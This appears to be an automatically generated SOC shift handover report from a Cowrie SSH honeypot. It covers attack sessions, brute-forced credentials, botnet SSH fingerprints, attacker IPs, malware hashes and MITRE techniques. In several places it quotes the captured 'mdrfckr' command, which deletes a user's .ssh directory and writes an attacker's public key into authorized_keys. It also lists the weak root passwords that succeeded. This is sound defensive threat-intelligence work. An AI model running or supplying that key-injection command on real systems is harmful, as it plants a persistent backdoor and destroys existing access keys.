# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-09 |
| **Generated At** | 2026-05-09T06:20:50Z |
| **Shift Time** | 06:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **64** |
| Confirmed Threats | **42** |
| False Positives Filtered | **22** (34.4%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **17** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **39** |
| Unique Credential Pairs | **33** |
| Unique Usernames | **23** |
| Unique Passwords | **31** |
| Successful Auth Pairs | **6** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `345gs5662d34` | 4 |
| `admin` | 3 |
| `user1` | 3 |
| `postgres` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 4 |
| `3245gs5662d34` | 4 |
| `test` | 2 |
| `123` | 2 |
| `toor` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `3245gs5662d34` | 4 |
| `root` | `toor` | 1 |
| `user002` | `user002` | 1 |
| `usertest` | `usertest` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toor` | `46.10.98.251` | 2026-05-09T03:52:30 |
| `root` | `admin%$#@!` | `43.130.90.166` | 2026-05-09T04:39:43 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-05-09T04:39:49 |
| `root` | `odoo2019` | `43.130.90.166` | 2026-05-09T04:41:36 |
| `root` | `admin!23$` | `43.130.90.166` | 2026-05-09T04:45:34 |
| `root` | `serverroot` | `43.130.90.166` | 2026-05-09T04:48:07 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **64** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 40 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 39 | 2 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `748f8c627d3f...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 39 | 2 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `748f8c627d3f...` | Unknown | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.130.90.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **24** |
| High-Risk ASNs | **4** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135799` | Rapidnet Private Limited | 2 | LOW |
| `AS28523` | Television Internacional, S.A. de C.V. | 1 | LOW |
| `AS208570` | Spark for Information Technology Services Ltd | 1 | LOW |
| `AS263762` | COOPERATIVA DE ELECTRIFICACIÓN RURAL DE GUANACASTE R.L. | 1 | LOW |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS17816` | China Unicom IP network China169 Guangdong province | 1 | LOW |
| `AS13188` | CONTENT DELIVERY NETWORK LTD | 1 | LOW |
| `AS202425` | IP Volume inc | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d07735e8cd3e

| Field | Detail |
|---|---|
| **Source IP** | `46.10.98[.]251` |
| **First Seen** | 2026-05-09 03:52 |
| **Last Seen** | 2026-05-09 03:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 03:52:29` | `cowrie.session.connect` |
| `2026-05-09 03:52:29` | `cowrie.client.version` |
| `2026-05-09 03:52:29` | `cowrie.client.kex` |
| `2026-05-09 03:52:30` | `cowrie.login.success` |
| `2026-05-09 03:52:31` | `cowrie.client.size` |
| `2026-05-09 03:52:31` | `cowrie.session.params` |
| `2026-05-09 03:52:32` | `cowrie.log.closed` |
| `2026-05-09 03:52:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.10.98[.]251` to AbuseIPDB if not already reported
- [ ] Block `46.10.98[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f0975552c0

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:39 |
| **Last Seen** | 2026-05-09 04:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:39:42` | `cowrie.session.connect` |
| `2026-05-09 04:39:42` | `cowrie.client.version` |
| `2026-05-09 04:39:42` | `cowrie.client.kex` |
| `2026-05-09 04:39:43` | `cowrie.login.success` |
| `2026-05-09 04:39:44` | `cowrie.session.params` |
| `2026-05-09 04:39:44` | `cowrie.command.input` |
| `2026-05-09 04:39:44` | `cowrie.command.failed` |
| `2026-05-09 04:39:44` | `cowrie.log.closed` |
| `2026-05-09 04:39:45` | `cowrie.session.params` |
| `2026-05-09 04:39:45` | `cowrie.command.input` |
| `2026-05-09 04:39:45` | `cowrie.session.file_download` |
| `2026-05-09 04:39:45` | `cowrie.log.closed` |
| `2026-05-09 04:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf9897a2a03

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:39 |
| **Last Seen** | 2026-05-09 04:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:39:48` | `cowrie.session.connect` |
| `2026-05-09 04:39:48` | `cowrie.client.version` |
| `2026-05-09 04:39:48` | `cowrie.client.kex` |
| `2026-05-09 04:39:49` | `cowrie.login.success` |
| `2026-05-09 04:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73a4bd4ef73

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:41 |
| **Last Seen** | 2026-05-09 04:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:41:35` | `cowrie.session.connect` |
| `2026-05-09 04:41:35` | `cowrie.client.version` |
| `2026-05-09 04:41:35` | `cowrie.client.kex` |
| `2026-05-09 04:41:36` | `cowrie.login.success` |
| `2026-05-09 04:41:37` | `cowrie.session.params` |
| `2026-05-09 04:41:37` | `cowrie.command.input` |
| `2026-05-09 04:41:37` | `cowrie.command.failed` |
| `2026-05-09 04:41:37` | `cowrie.log.closed` |
| `2026-05-09 04:41:38` | `cowrie.session.params` |
| `2026-05-09 04:41:38` | `cowrie.command.input` |
| `2026-05-09 04:41:38` | `cowrie.session.file_download` |
| `2026-05-09 04:41:38` | `cowrie.log.closed` |
| `2026-05-09 04:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2246113691f6

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:41 |
| **Last Seen** | 2026-05-09 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:41:41` | `cowrie.session.connect` |
| `2026-05-09 04:41:41` | `cowrie.client.version` |
| `2026-05-09 04:41:41` | `cowrie.client.kex` |
| `2026-05-09 04:41:42` | `cowrie.login.success` |
| `2026-05-09 04:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a9adcc3c7ce

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:45 |
| **Last Seen** | 2026-05-09 04:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:45:32` | `cowrie.session.connect` |
| `2026-05-09 04:45:32` | `cowrie.client.version` |
| `2026-05-09 04:45:32` | `cowrie.client.kex` |
| `2026-05-09 04:45:34` | `cowrie.login.success` |
| `2026-05-09 04:45:34` | `cowrie.session.params` |
| `2026-05-09 04:45:34` | `cowrie.command.input` |
| `2026-05-09 04:45:34` | `cowrie.command.failed` |
| `2026-05-09 04:45:34` | `cowrie.log.closed` |
| `2026-05-09 04:45:35` | `cowrie.session.params` |
| `2026-05-09 04:45:35` | `cowrie.command.input` |
| `2026-05-09 04:45:35` | `cowrie.session.file_download` |
| `2026-05-09 04:45:35` | `cowrie.log.closed` |
| `2026-05-09 04:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bc37b4f825

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:45 |
| **Last Seen** | 2026-05-09 04:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:45:38` | `cowrie.session.connect` |
| `2026-05-09 04:45:38` | `cowrie.client.version` |
| `2026-05-09 04:45:39` | `cowrie.client.kex` |
| `2026-05-09 04:45:40` | `cowrie.login.success` |
| `2026-05-09 04:45:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7031f402c857

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:48 |
| **Last Seen** | 2026-05-09 04:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:48:06` | `cowrie.session.connect` |
| `2026-05-09 04:48:06` | `cowrie.client.version` |
| `2026-05-09 04:48:06` | `cowrie.client.kex` |
| `2026-05-09 04:48:07` | `cowrie.login.success` |
| `2026-05-09 04:48:08` | `cowrie.session.params` |
| `2026-05-09 04:48:08` | `cowrie.command.input` |
| `2026-05-09 04:48:08` | `cowrie.command.failed` |
| `2026-05-09 04:48:08` | `cowrie.log.closed` |
| `2026-05-09 04:48:09` | `cowrie.session.params` |
| `2026-05-09 04:48:09` | `cowrie.command.input` |
| `2026-05-09 04:48:09` | `cowrie.session.file_download` |
| `2026-05-09 04:48:09` | `cowrie.log.closed` |
| `2026-05-09 04:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2f9f8c8b414

| Field | Detail |
|---|---|
| **Source IP** | `43.130.90[.]166` |
| **First Seen** | 2026-05-09 04:48 |
| **Last Seen** | 2026-05-09 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-09 04:48:12` | `cowrie.session.connect` |
| `2026-05-09 04:48:12` | `cowrie.client.version` |
| `2026-05-09 04:48:12` | `cowrie.client.kex` |
| `2026-05-09 04:48:13` | `cowrie.login.success` |
| `2026-05-09 04:48:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `43.130.90[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `43.130.90[.]166` | **30** | 2026-05-09 04:31 | 2026-05-09 04:56 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.197.147[.]76` | 1 | 2026-05-09 05:54 | 2026-05-09 05:54 | 39s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-05-09 04:32 | 2026-05-09 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]18` | 1 | 2026-05-09 04:02 | 2026-05-09 04:02 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `43.130.90[.]166` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `180.76.243[.]197` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `185.242.226[.]18` | NL | HostUS Solutions LLC | **100** ⚠️ | 0 |
| `138.197.147[.]76` | CA | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `1.160.202[.]47` | TW | Chunghwa Telecom Data Communication Business Group | **77** | 0 |
| `47.111.164[.]182` | CN | Aliyun Computing Co., LTD | **70** | 0 |
| `84.54.70[.]56` | UZ | Uzbektelekom Joint Stock Company | **60** | 3 |
| `163.142.120[.]243` | CN | China Unicom Guangdong province network | **49** | 0 |
| `103.83.148[.]69` | IN | Rapidnet Private Limited | **43** | 1 |
| `103.83.148[.]4` | IN | Rapidnet Private Limited | **41** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 42 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 1 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 13 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 64 cases |
| Tool 34  | Credential Extractor        | ✅ 39 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
